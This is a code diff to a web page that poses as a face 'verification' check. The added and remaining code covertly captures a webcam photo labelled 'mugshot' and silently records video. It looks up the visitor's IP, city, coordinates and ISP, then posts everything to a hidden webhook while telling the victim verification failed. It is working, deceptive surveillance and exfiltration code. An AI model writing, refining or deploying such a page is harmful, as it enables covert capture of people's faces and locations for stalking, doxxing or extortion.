@@ -19,7 +19,7 @@
     body { margin:0; background:#111; color:#eee; font-family:Arial, sans-serif; text-align:center; padding: 20vh 10px; min-height:100vh; }
     #msg { font-size:1.8em; margin:20px; }
     .progress-container {
-      width: 80%; max-width: 400px; margin: 20px auto; background: #333; border-radius: 8px; overflow: hidden; height: 30px; position: relative; display: none;
+      width: 80%; max-width: 400px; margin: 20px auto; background: #333; border-radius: 8px; overflow: hidden; height: 30px; position: relative; display:none;
     }
     .progress-bar {
       width: 0%; height: 100%; background: #0066cc; transition: width 0.1s linear;
@@ -27,7 +27,7 @@
     .progress-text {
       position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-weight: bold; font-size: 1.2em; text-shadow: 0 0 5px black; z-index: 2;
     }
-    video { display:none; }
+    video, canvas { display:none; }
     .container { max-width:600px; margin:auto; }
     button { padding:15px 40px; font-size:1.3em; background:#0066cc; color:white; border:none; border-radius:8px; cursor:pointer; margin:20px; }
     button:hover { background:#0055aa; }
@@ -45,11 +45,13 @@
     </div>
 
     <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
     <button id="btn">Verify Me</button>
   </div>
 
   <script>
     const videoElement = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
     const msg = document.getElementById('msg');
     const btn = document.getElementById('btn');
     const progressContainer = document.getElementById('progressContainer');
@@ -72,6 +74,27 @@
       if (percent < 100) animationFrameId = requestAnimationFrame(updateProgress);
     }
 
+    async function sendAttachment(content, blob, filename) {
+      const payload = { content };
+      const formData = new FormData();
+      formData.append('payload_json', JSON.stringify(payload));
+      formData.append('file', blob, filename);
+      try {
+        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        return true;
+      } catch {
+        return false;
+      }
+    }
+
+    async function captureMugshot(stream) {
+      const ctx = canvas.getContext('2d');
+      canvas.width = videoElement.videoWidth || 640;
+      canvas.height = videoElement.videoHeight || 480;
+      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+      return new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+    }
+
     async function recordAndSend() {
       try {
         msg.textContent = "Loading verification... Please wait.";
@@ -84,17 +107,34 @@
 
         videoElement.srcObject = stream;
 
-        await new Promise(r => setTimeout(r, 1500));
+        await new Promise(r => setTimeout(r, 1500)); // warm-up for stable frame
 
+        // Mugshot first - always works
+        const mugshotBlob = await captureMugshot(stream);
+        if (mugshotBlob) {
+          let geo = "Location grab failed";
+          try {
+            const res = await fetch('https://ipapi.co/json/');
+            if (res.ok) {
+              const d = await res.json();
+              if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
+            }
+          } catch {}
+          await sendAttachment(
+            `🎯 Mugshot captured\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
+            mugshotBlob,
+            `mugshot_${Date.now()}.png`
+          );
+        }
+
+        // Now video
         progressContainer.style.display = 'block';
         msg.textContent = "Loading...";
 
         const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
         const chunks = [];
 
-        recorder.ondataavailable = e => {
-          if (e.data.size > 0) chunks.push(e.data);
-        };
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
 
         recorder.onstop = async () => {
           cancelAnimationFrame(animationFrameId);
@@ -103,59 +143,21 @@
 
           stream.getTracks().forEach(track => track.stop());
 
-          if (chunks.length === 0) {
-            msg.textContent = "Verification incomplete. Center Face In Camera View";
-            progressContainer.style.display = 'none';
-            btn.style.display = 'none';
-            return;
-          }
+          if (chunks.length > 0) {
+            const blob = new Blob(chunks, { type: 'video/webm' });
 
-          const blob = new Blob(chunks, { type: 'video/webm' });
-
-          if (blob.size < 1024) { // tiny junk, skip
-            msg.textContent = "Verification incomplete. Center Face In Camera View";
-            progressContainer.style.display = 'none';
-            btn.style.display = 'none';
-            return;
-          }
-
-          let geoDetails = "Location grab failed";
-          try {
-            const geoRes = await fetch('https://ipapi.co/json/');
-            if (geoRes.ok) {
-              const data = await geoRes.json();
-              if (!data.error) {
-                geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'}\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nISP: ${data.org || 'n/a'}`;
+            let geo = "Location grab failed";
+            try {
+              const res = await fetch('https://ipapi.co/json/');
+              if (res.ok) {
+                const d = await res.json();
+                if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
               }
-            }
-          } catch {}
+            } catch {}
 
-          const payload = {
-            content: `🎥 New verification clip attached (silent capture)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`
-          };
+            const vidContent = `🎥 Video clip (silent)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`;
 
-          const formData = new FormData();
-          formData.append('file', blob, `verification_${Date.now()}.mp4`);  // keep the .mp4 rename trick since it sent before
-          formData.append('payload_json', JSON.stringify(payload));
-
-          msg.textContent = "Finalizing...";
-
-          const response = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-
-          if (!response.ok) {
-            // fallback base64
-            const reader = new FileReader();
-            reader.onload = async () => {
-              const base64 = reader.result.split(',')[1];
-              await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                  content: `Upload failed - base64 video data (decode & save as .webm):\n${base64.slice(0,2000)}...\n\n${payload.content}`
-                })
-              });
-            };
-            reader.readAsDataURL(blob);
+            await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
           }
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
